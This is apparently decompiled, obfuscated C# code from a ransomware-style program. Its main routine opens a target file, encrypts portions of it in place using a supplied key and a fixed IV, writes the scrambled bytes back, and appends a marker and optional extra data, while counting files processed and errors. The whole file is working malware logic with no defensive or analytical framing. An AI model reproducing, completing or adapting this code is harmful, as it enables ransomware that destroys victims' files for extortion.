using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ceQNxnERCANV;

namespace oXSOOyVgTNm;

internal sealed class bsHFtVGxaUZhONS
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int LEgVKzEZiLhAwUy(long long_0)
	{
		return (int)long_0;
	}

	public static void fymkhkKbxkbn(string uurlRnGsxqhkfvTZX, string AseLdWDkvIh, string RGQhBZBATEEoc, byte[] bdrUBoUadTCm = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(uurlRnGsxqhkfvTZX, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = LEgVKzEZiLhAwUy(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(AseLdWDkvIh) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(AseLdWDkvIh) * 1000 * 1000;
				}
				int lqCIHtYFtyWgwmy = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = nvyEeuZZfriZQ(uurlRnGsxqhkfvTZX, fileStream, lqCIHtYFtyWgwmy, num * i);
					array = (NuHMiFuRoVNiZNRl.DseMmyGrBoOjezM ? RfklKQbYsGtli.zKFUoKSoRuLY(byte_, Encoding.ASCII.GetBytes(RGQhBZBATEEoc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xDMypKOxUD.EmzieFXgUGooI(byte_, Encoding.ASCII.GetBytes(RGQhBZBATEEoc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					wHOpfQAixavz(uurlRnGsxqhkfvTZX, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (NuHMiFuRoVNiZNRl.OGOvpjxWqYzkk ? Encoding.ASCII.GetBytes(NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107398764)) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399780)) + Convert.ToString(AseLdWDkvIh) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399780))) : Encoding.ASCII.GetBytes(NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107398764)) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399757)) + Convert.ToString(AseLdWDkvIh) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399757))));
			if (!NuHMiFuRoVNiZNRl.OGOvpjxWqYzkk)
			{
				using FileStream fileStream2 = new FileStream(uurlRnGsxqhkfvTZX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(uurlRnGsxqhkfvTZX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(bdrUBoUadTCm, 0, bdrUBoUadTCm.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (NuHMiFuRoVNiZNRl.sfIQAmNvQu)
			{
				try
				{
					File.AppendAllText(NuHMiFuRoVNiZNRl.DFeZKWhzZEN, getString_0(107385498) + uurlRnGsxqhkfvTZX + getString_0(107398783) + ex.Message + getString_0(107396708));
				}
				catch (Exception)
				{
				}
			}
			NuHMiFuRoVNiZNRl.OePGqyfYpLiYf++;
		}
		NuHMiFuRoVNiZNRl.cLVmkVhYZQAqR++;
	}

	public static byte[] nvyEeuZZfriZQ(string caCVJHjOEbcuh, FileStream RJRQiuKCgHfFp, int LqCIHtYFtyWgwmy, int GQriETrdBBX = 0)
	{
		byte[] array = new byte[LqCIHtYFtyWgwmy];
		RJRQiuKCgHfFp.Position = GQriETrdBBX;
		RJRQiuKCgHfFp.Read(array, 0, LqCIHtYFtyWgwmy);
		return array;
	}

	public static void wHOpfQAixavz(string GWiTyhBKzlXtJDQ, FileStream MErmcYUvba, byte[] qDdQUpzOTSsU, int nzghQVOVWemWwY = 0)
	{
		MErmcYUvba.Position = nzghQVOVWemWwY;
		MErmcYUvba.Write(qDdQUpzOTSsU, 0, qDdQUpzOTSsU.Length);
	}

	static bsHFtVGxaUZhONS()
	{
		Strings.CreateGetStringDelegate(typeof(bsHFtVGxaUZhONS));
	}
}
